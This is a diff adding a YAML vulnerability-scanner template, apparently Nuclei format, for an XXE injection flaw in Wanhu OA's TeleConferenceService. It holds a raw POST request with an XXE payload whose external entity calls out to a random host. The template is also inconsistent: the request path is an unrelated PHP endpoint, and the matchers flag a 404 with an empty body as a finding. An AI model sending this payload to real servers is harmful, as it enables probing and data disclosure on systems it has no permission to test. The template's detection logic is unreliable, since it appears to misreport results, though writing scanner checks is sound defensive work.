@@ -1,0 +1,34 @@
+id: wanhuOA-TeleConferenceService-xml-injection
+
+info:
+  name: 万户OA TeleConferenceService XXE注入漏洞
+  author: cnaq
+  severity: medium   
+  description: 万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  tags: wanhuOA,xml,injection
+
+requests:
+  - raw:
+      - |
+        POST /general/status_bar/get_recent.php HTTP/1.1
+        Host: {{Hostname}}
+
+        <?xml version="1.0" encoding="UTF-8" ?>
+        <!DOCTYPE ANY [
+        <!ENTITY xxe SYSTEM "http://{{randstr}}.{{randstr}}.com" >]>        
+        <value>&xxe;</value>
+   
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - HTTP/1.1 404 Not Found
+          
+      - type: dsl
+        dsl:
+          - 'len(body)==0'
+    
+
